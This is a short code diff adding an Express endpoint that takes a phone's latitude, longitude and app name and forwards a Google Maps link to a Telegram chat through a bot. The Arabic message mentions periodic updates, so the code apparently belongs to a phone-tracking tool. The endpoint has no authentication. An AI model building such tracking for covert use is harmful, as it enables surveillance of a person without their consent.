@@ -55,6 +55,18 @@ async function startServer() {
     }
   });
 
+  app.post("/api/location", (req, res) => {
+    const { chatId, latitude, longitude, appName } = req.body;
+    if (bot && chatId && latitude && longitude) {
+      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const message = `📍 موقع الهاتف الحالي (${appName || 'تحديث دوري'}):\n${mapsUrl}`;
+      bot.sendMessage(chatId, message);
+      res.json({ success: true });
+    } else {
+      res.status(400).json({ success: false, error: "Missing data" });
+    }
+  });
+
   // Vite middleware for development
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
